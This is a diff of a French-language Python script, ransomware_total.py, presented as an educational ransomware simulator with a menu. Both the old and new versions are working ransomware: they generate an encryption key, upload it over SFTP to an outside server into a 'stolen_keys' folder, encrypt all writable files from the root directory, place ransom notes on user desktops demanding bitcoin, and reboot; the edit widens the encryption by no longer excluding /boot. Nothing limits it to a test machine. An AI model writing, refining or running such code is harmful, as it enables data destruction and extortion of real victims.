@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# ransomware_total.py - Simulation pédagogique de ransomware avec menu
+# ransomware_total.py - Simulation pédagogique complète
 # Usage: sudo python3 ransomware_total.py (UNIQUEMENT EN VM ISOLEE)
 
 import logging
@@ -8,7 +8,7 @@ import socket
 import subprocess
 import sys
 import time
-from paramiko import SFTPClient, Transport
+import paramiko
 from cryptography.fernet import Fernet
 
 # Configuration initiale
@@ -22,7 +22,6 @@ logging.basicConfig(
     format="%(asctime)s - %(levelname)s - %(message)s"
 )
 
-
 class RansomwareSimulator:
     def __init__(self):
         self.fernet = None
@@ -35,7 +34,7 @@ class RansomwareSimulator:
         }
 
     def check_root(self):
-        """Vérifie si le script est exécuté en root"""
+        """Vérifie les privilèges root"""
         if os.geteuid() != 0:
             logging.error("Le script doit être exécuté en tant que root!")
             sys.exit(1)
@@ -47,37 +46,36 @@ class RansomwareSimulator:
             with open(SFTP_KEY_PATH, "wb") as key_file:
                 key_file.write(self.key)
             self.fernet = Fernet(self.key)
-            logging.info(f"Clé de chiffrement générée: {SFTP_KEY_PATH}")
-            print(f"\n[+] Clé générée avec succès: {SFTP_KEY_PATH}")
+            logging.info(f"Clé générée: {SFTP_KEY_PATH}")
+            print(f"\n[+] Clé générée: {SFTP_KEY_PATH}")
             return True
         except Exception as e:
             logging.error(f"Erreur génération clé: {str(e)}")
             return False
 
     def configure_sftp(self):
-        """Configure les paramètres SFTP via l'interface utilisateur"""
+        """Configure les paramètres SFTP"""
         print("\n[ Configuration SFTP ]")
-        self.sftp_config['server'] = input("Adresse IP du serveur SFTP: ").strip()
-        self.sftp_config['user'] = input("Nom d'utilisateur SFTP: ").strip()
+        self.sftp_config['server'] = input("IP du serveur SFTP: ").strip()
+        self.sftp_config['user'] = input("Utilisateur SFTP: ").strip()
         self.sftp_config['password'] = input("Mot de passe SFTP: ").strip()
-
         port = input("Port SFTP [22]: ").strip()
         self.sftp_config['port'] = int(port) if port else 22
 
     def send_key_via_sftp(self):
         """Transmet la clé via SFTP"""
         if not self.key:
-            print("\n[!] Aucune clé générée. Veuillez d'abord générer une clé.")
+            print("\n[!] Générer d'abord une clé")
             return False
 
         try:
-            transport = Transport((self.sftp_config['server'], self.sftp_config['port']))
+            transport = paramiko.Transport((self.sftp_config['server'], self.sftp_config['port']))
             transport.connect(username=self.sftp_config['user'], password=self.sftp_config['password'])
-            sftp = SFTPClient.from_transport(transport)
+            sftp = paramiko.SFTPClient.from_transport(transport)
 
             remote_dir = f"/home/{self.sftp_config['user']}/stolen_keys"
             try:
-                sftp.mkdir(remote_dir)  # Crée le dossier si inexistant
+                sftp.mkdir(remote_dir)
             except IOError:
                 pass
 
@@ -86,100 +84,109 @@ class RansomwareSimulator:
             sftp.close()
             transport.close()
 
-            logging.info(f"Clé transmise à {self.sftp_config['server']}:{remote_path}")
-            print(f"\n[+] Clé envoyée avec succès à {self.sftp_config['server']}")
+            logging.info(f"Clé envoyée à {self.sftp_config['server']}:{remote_path}")
+            print(f"\n[+] Clé envoyée à {self.sftp_config['server']}")
             return True
         except Exception as e:
-            logging.error(f"Échec transmission SFTP: {str(e)}")
-            print(f"\n[!] Échec de l'envoi: {str(e)}")
+            logging.error(f"Échec SFTP: {str(e)}")
+            print(f"\n[!] Échec envoi: {str(e)}")
             return False
 
     def encrypt_file(self, filepath):
-        """Chiffre un fichier en place avec Fernet"""
+        """Chiffre un fichier en place"""
         try:
-            with open(filepath, "rb") as file:
-                original_data = file.read()
+            # Vérification supplémentaire pour éviter les fichiers spéciaux
+            if not os.path.isfile(filepath) or os.path.islink(filepath):
+                return False
 
-            encrypted_data = self.fernet.encrypt(original_data)
+            with open(filepath, "rb") as f:
+                original = f.read()
 
-            with open(filepath, "wb") as file:
-                file.write(encrypted_data)
+            encrypted = self.fernet.encrypt(original)
 
-            logging.debug(f"Fichier chiffré: {filepath}")
+            with open(filepath, "wb") as f:
+                f.write(encrypted)
+
             return True
         except Exception as e:
-            logging.warning(f"Échec chiffrement {filepath}: {str(e)}")
+            logging.warning(f"Erreur sur {filepath}: {str(e)}")
             return False
 
     def encrypt_system(self):
-        """Parcourt et chiffre le système de fichiers"""
+        """Chiffre tous les fichiers accessibles"""
         if not self.fernet:
-            print("\n[!] Aucune clé configurée. Générez d'abord une clé.")
+            print("\n[!] Générer d'abord une clé")
+            return
+
+        print("\n[!] ATTENTION: Chiffrement complet du système!")
+        confirm = input("Confirmez (tapez 'CHIFFRER'): ")
+        if confirm != "CHIFFRER":
+            print("Annulé")
             return
 
         exclude_dirs = {
             '/proc', '/sys', '/dev', '/run', '/tmp',
-            '/var/run', '/var/lock', '/snap', '/boot'
+            '/var/run', '/var/lock', '/snap'
         }
 
-        print("\n[!] ATTENTION: Cette opération va chiffrer tous les fichiers accessibles!")
-        confirm = input("Confirmez-vous le chiffrement? (tapez 'CONFIRM'): ")
-        if confirm != "CONFIRM":
-            print("Annulation du chiffrement.")
-            return
-
-        total_encrypted = 0
+        total = 0
         start_time = time.time()
 
         for root, _, files in os.walk('/'):
-            if any(root.startswith(ex_dir) for ex_dir in exclude_dirs):
+            if any(root.startswith(ex) for ex in exclude_dirs):
                 continue
 
-            for filename in files:
-                filepath = os.path.join(root, filename)
+            for file in files:
+                filepath = os.path.join(root, file)
                 try:
-                    if os.path.isfile(filepath) and os.access(filepath, os.W_OK):
+                    if os.access(filepath, os.W_OK):
                         if self.encrypt_file(filepath):
-                            total_encrypted += 1
-                            if total_encrypted % 100 == 0:
-                                print(f"\r[+] Fichiers chiffrés: {total_encrypted}", end='')
+                            total += 1
+                            if total % 100 == 0:
+                                print(f"\r[+] Fichiers chiffrés: {total}", end='')
                 except Exception as e:
-                    logging.warning(f"Erreur traitement {filepath}: {str(e)}")
                     continue
 
-        logging.info(f"Chiffrement terminé. {total_encrypted} fichiers chiffrés en {time.time() - start_time:.2f}s")
-        print(f"\n\n[+] Opération terminée. {total_encrypted} fichiers chiffrés.")
+        logging.info(f"Chiffrement terminé: {total} fichiers en {time.time()-start_time:.2f}s")
+        print(f"\n\n[+] Terminé: {total} fichiers chiffrés")
 
     def create_ransom_note(self):
-        """Crée un message de rançon"""
+        """Crée le fichier README sur le bureau"""
         note = f"""
         VOS FICHIERS ONT ÉTÉ CHIFFRÉS!
 
-        Pour récupérer vos données, vous devez:
-        1. Envoyer 0.5 BTC à l'adresse: 1Ma1wareSimu1BitcoinAddres5
-        2. Envoyer un email à ransomware@example.com avec votre ID: {socket.gethostname()}
-
-        Vous avez 72 heures avant que la clé ne soit définitivement supprimée.
+        Pour récupérer vos données:
+        1. Envoyez 0.5 BTC à: 1Ma1wareSimu1BitcoinAddres5
+        2. Contactez: ransomware@example.com
+        ID: {socket.gethostname()}
         """
 
-        note_paths = ['/root/README.txt', '/home/README.txt', '/README.txt']
+        # Place le README sur tous les bureaux trouvés
         created = 0
+        for root, dirs, _ in os.walk('/home'):
+            if 'Desktop' in dirs:
+                path = os.path.join(root, 'Desktop', 'README.txt')
+                try:
+                    with open(path, 'w') as f:
+                        f.write(note)
+                    created += 1
+                except:
+                    continue
 
-        for path in note_paths:
-            try:
-                with open(path, 'w') as f:
-                    f.write(note)
-                logging.info(f"Note de rançon créée: {path}")
-                created += 1
-            except Exception as e:
-                logging.warning(f"Impossible de créer la note {path}: {str(e)}")
+        # Ajoute aussi à la racine
+        try:
+            with open('/README.txt', 'w') as f:
+                f.write(note)
+            created += 1
+        except:
+            pass
 
-        print(f"\n[+] {created} notes de rançon placées dans le système.")
+        print(f"\n[+] {created} notes de rançon placées")
 
     def reboot_system(self):
         """Redémarre le système"""
-        print("\n[!] Le système va redémarrer...")
-        logging.info("Déclenchement du redémarrage du système")
+        print("\n[!] Redémarrage en cours...")
+        logging.info("Déclenchement du redémarrage")
         try:
             subprocess.run(['reboot'], check=True)
         except subprocess.CalledProcessError as e:
@@ -189,17 +196,17 @@ class RansomwareSimulator:
     def show_menu(self):
         """Affiche le menu principal"""
         while True:
-            print("\n" + "=" * 50)
-            print(" MENU PRINCIPAL - RANSOMWARE SIMULATEUR")
-            print("=" * 50)
+            print("\n" + "="*50)
+            print(" RANSOMWARE SIMULATEUR - MENU PRINCIPAL")
+            print("="*50)
             print("1. Générer une clé de chiffrement")
             print("2. Configurer le serveur SFTP")
             print("3. Envoyer la clé via SFTP")
-            print("4. Chiffrer le système")
+            print("4. Chiffrer TOUS les fichiers (/)")
             print("5. Placer les notes de rançon")
             print("6. Redémarrer le système")
             print("0. Quitter")
-            print("=" * 50)
+            print("="*50)
 
             choice = input("\nVotre choix: ").strip()
 
@@ -219,16 +226,14 @@ class RansomwareSimulator:
                 print("\n[+] Fermeture du programme.")
                 sys.exit(0)
             else:
-                print("\n[!] Choix invalide. Veuillez réessayer.")
-
+                print("\n[!] Choix invalide")
 
 def main():
     """Fonction principale"""
     simulator = RansomwareSimulator()
     simulator.check_root()
-    logging.info("=== Démarrage du simulateur ransomware ===")
+    logging.info("=== Démarrage du simulateur ===")
     simulator.show_menu()
-
 
 if __name__ == "__main__":
     main()
